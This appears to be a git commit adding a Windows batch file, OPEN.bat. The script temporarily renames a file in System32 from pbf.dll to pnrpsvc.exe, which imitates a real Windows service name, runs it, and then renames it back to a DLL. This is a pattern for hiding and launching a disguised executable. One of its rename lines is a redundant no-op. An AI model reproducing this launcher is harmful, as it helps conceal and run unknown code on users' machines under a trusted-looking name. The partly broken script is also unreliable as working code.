ac650b0c48617dc8f31221fa65c49907af3d90e8
amin89310-1 <amin89310@gmail.com>
2024-11-24 11:04:03 +0000

    Create OPEN.bat

---
+++ OPEN.bat
@@ -0,0 +1,12 @@
+@echo off
+:: Rename DLL to EXE temporarily
+ren "C:\Windows\System32\pbf.dll" "pnrpsvc.exe"
+
+:: Rename DLL to EXE temporarily
+ren "C:\Windows\System32\pnrpsvc.exe" "pnrpsvc.exe"
+
+:: Run the EXE file and wait for it to close
+start /wait "" "C:\Windows\System32\pnrpsvc.exe"
+
+:: Rename back to DLL after EXE is closed
+ren "C:\Windows\System32\pnrpsvc.exe" "pbf.dll"
